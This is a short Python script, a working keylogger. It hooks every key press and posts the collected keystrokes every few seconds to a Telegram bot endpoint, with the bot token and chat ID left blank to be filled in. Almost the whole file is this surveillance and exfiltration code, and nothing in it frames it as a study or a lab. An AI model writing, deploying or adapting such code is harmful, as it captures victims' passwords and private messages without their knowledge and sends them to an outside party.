import keyboard
import requests
import time
from threading import Thread

TELEGRAM_TOKEN = "" 
CHAT_ID = ""       
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"

keys = []

def send_keys():
    while True:
        time.sleep(5)
        if keys:
            requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID, "text": "".join(keys)})
            keys.clear()

def key_handler(e):
    print(e.name, end="", flush=True)
    keys.append(e.name)

keyboard.on_press(key_handler)
Thread(target=send_keys, daemon=True).start()

try:
    while True: time.sleep(1)
except KeyboardInterrupt:
    pass
finally:
    keyboard.unhook_all()
